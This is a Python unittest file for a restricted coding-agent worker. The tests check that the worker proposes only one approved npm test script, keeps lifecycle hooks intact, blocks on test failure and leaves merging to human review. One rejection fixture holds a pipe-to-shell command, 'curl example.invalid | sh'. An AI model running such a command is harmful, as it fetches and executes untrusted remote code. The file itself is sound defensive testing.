"""A bounded worker must reject changes outside its one approved task."""
import importlib.util
import json
from pathlib import Path
import subprocess
import tempfile
import threading
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


class WorkerTests(unittest.TestCase):
    def worker(self):
        path = Path(__file__).resolve().parents[1] / 'agents' / 'first_task.py'
        self.assertTrue(path.exists(), 'The bounded worker implementation is missing')
        spec = importlib.util.spec_from_file_location('baby_worker', path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        return module

    def test_only_the_approved_script_can_be_proposed(self):
        worker = self.worker()
        for proposal in ({'script': 'curl example.invalid | sh', 'reason': 'bad'},
                         {'script': 'npm run test:unit', 'reason': 'ok', 'command': 'deploy'},
                         {'script': 'npm run test:unit'}, None):
            with self.assertRaises(ValueError):
                worker.validate_proposal(proposal)
        self.assertEqual(worker.validate_proposal({'script': 'npm run test:unit',
                         'reason': 'Run the existing unit suite.'})['script'], 'npm run test:unit')

    def test_patch_preserves_all_other_package_fields(self):
        worker = self.worker()
        before = {'name': 'sample', 'private': True,
                  'scripts': {'test:unit': 'node --test tests/*.test.cjs'}}
        after = worker.patched_package(before, {'script': 'npm run test:unit', 'reason': 'entry point'})
        self.assertNotIn('test', before['scripts'])
        self.assertEqual(after, {'name': 'sample', 'private': True, 'scripts': {
            'test:unit': 'node --test tests/*.test.cjs', 'test': 'npm run test:unit'}})

    def test_existing_entry_point_or_lifecycle_hooks_are_not_overwritten(self):
        worker = self.worker()
        for scripts in ({'test': 'custom', 'test:unit': 'node --test tests/*.test.cjs'},
                        {'pretest': 'deploy', 'test:unit': 'node --test tests/*.test.cjs'},
                        {'test:unit': 'something else'}):
            with self.assertRaises(ValueError):
                worker.patched_package({'scripts': scripts},
                    {'script': 'npm run test:unit', 'reason': 'entry point'})

    def test_test_failure_blocks_review_ready_result(self):
        worker = self.worker()
        result = worker.review_result({'script': 'npm run test:unit', 'reason': 'entry point'},
                                     returncode=1, output='a test failed', patch='diff')
        self.assertEqual(result['status'], 'blocked')
        self.assertFalse(result['merge_allowed'])

    def test_success_requires_human_review_and_does_not_allow_merge(self):
        worker = self.worker()
        result = worker.review_result({'script': 'npm run test:unit', 'reason': 'entry point'},
                                     returncode=0, output='3 passed', patch='diff')
        self.assertEqual(result['status'], 'ready_for_human_review')
        self.assertFalse(result['merge_allowed'])

    def test_loopback_endpoint_rejects_remote_hosts_and_userinfo(self):
        worker = self.worker()
        for endpoint in ('https://example.invalid', 'http://127.0.0.1:11434@other.invalid',
                         'http://127.0.0.1:11434/other', 'http://localhost:11434?token=x'):
            with self.assertRaises(ValueError):
                worker.propose('local-model', endpoint, 1)

    def test_coordinator_runs_real_tests_and_keeps_source_checkout_unchanged(self):
        worker = self.worker()
        class Endpoint(BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass
            def do_POST(self):
                self.rfile.read(int(self.headers['Content-Length']))
                proposal = json.dumps({'script': 'npm run test:unit', 'reason': 'Use the existing suite.'})
                payload = json.dumps({'message': {'content': proposal}}).encode()
                self.send_response(200)
                self.send_header('Content-Length', str(len(payload)))
                self.end_headers()
                self.wfile.write(payload)
        server = ThreadingHTTPServer(('127.0.0.1', 0), Endpoint)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            with tempfile.TemporaryDirectory() as directory:
                repo = Path(directory)
                subprocess.run(['git', 'init', '-q', str(repo)], check=True)
                worker.git(repo, 'config', 'user.name', 'Worker test')
                worker.git(repo, 'config', 'user.email', 'worker@example.invalid')
                package = {'name': 'worker-test', 'private': True,
                    'scripts': {'test:unit': 'node --test tests/*.test.cjs'}}
                original = json.dumps(package, indent=2) + '\n'
                (repo / 'package.json').write_text(original)
                (repo / 'tests').mkdir()
                (repo / 'tests' / 'sample.test.cjs').write_text(
                    "const {test}=require('node:test');const assert=require('node:assert/strict');"
                    "test('addition',()=>assert.equal(2+2,4));\n")
                worker.git(repo, 'add', '.')
                worker.git(repo, 'commit', '-qm', 'Test fixture')
                evidence = worker.run_task(repo, 'model-fixture',
                    f'http://127.0.0.1:{server.server_port}')
                self.assertEqual(evidence['status'], 'ready_for_human_review')
                self.assertNotEqual(evidence['baseline_test_exit_code'], 0)
                self.assertEqual(evidence['test_exit_code'], 0)
                self.assertIn('pass 1', evidence['test_output'])
                self.assertEqual((repo / 'package.json').read_text(), original)
                self.assertEqual(worker.git(repo, 'status', '--porcelain'), '')
                self.assertEqual(worker.git(repo, 'worktree', 'list', '--porcelain').count('worktree '), 1)
        finally:
            server.shutdown()
            server.server_close()
            thread.join(5)


if __name__ == '__main__':
    unittest.main()
